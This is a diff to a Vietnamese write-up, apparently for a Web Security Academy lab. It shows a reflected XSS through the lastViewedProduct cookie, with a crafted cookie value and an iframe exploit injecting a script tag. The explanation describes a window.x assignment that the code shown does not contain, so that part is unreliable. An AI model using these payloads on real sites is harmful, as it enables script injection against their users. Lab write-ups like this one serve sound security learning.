@@ -76,16 +76,27 @@ Req của nó đây:
 <h1>---------------------------------------------------------</h1>
 <br>
 
+![image](https://github.com/user-attachments/assets/e8157373-7d34-4e6b-bf8c-245f1f105de2)
 
+Để ý sau khi xem 1 bài post thì ở cookie có xuất hiện lastViewedProduct:
 
+![image](https://github.com/user-attachments/assets/da111c19-3e50-467d-9412-a71f8c36e9d1)
 
+![image](https://github.com/user-attachments/assets/c307ae5f-7c34-4337-9713-0cc7c71f0cf8)
 
+Và đây là kết quả sau khi tôi sửa cookie thành `https://0a8200cc04b9058a87bca17900200028.web-security-academy.net/product?productId=2&https://0a8200cc04b9058a87bca17900200028.web-security-academy.net/product?productId=1&%27%3E%3Cscript%3Eprint%28%29%3C%2Fscript%3E`
 
+![image](https://github.com/user-attachments/assets/2bfadf07-969e-465c-a508-293f01f0a9de)
 
+![image](https://github.com/user-attachments/assets/e0d60a6b-1e7d-4950-bcec-d52c2d6f7302)
 
+Giờ chỉ cần đưa vào exploit là xong:
 
+```<iframe src="https://0a8200cc04b9058a87bca17900200028.web-security-academy.net/product?productId=3&'><script>print()</script>" onload="if(!window.x)this.src='https://0a8200cc04b9058a87bca17900200028.web-security-academy.net';">```
 
+window: Là đối tượng toàn cục trong trình duyệt, đại diện cho cửa sổ trình duyệt hiện tại, điều kiện if (!window.x) kiểm tra xem window.x có tồn tại hoặc có giá trị khác false, undefined, 0, null, NaN hay không, nếu window.x chưa tồn tại, trình duyệt sẽ thay đổi src của <iframe>, sau đó gán window.x = 1 để ngăn việc thay đổi này lặp lại
 
+![image](https://github.com/user-attachments/assets/203e1799-61cd-4331-8ad7-e20acd0fb2e7)
 
 
 
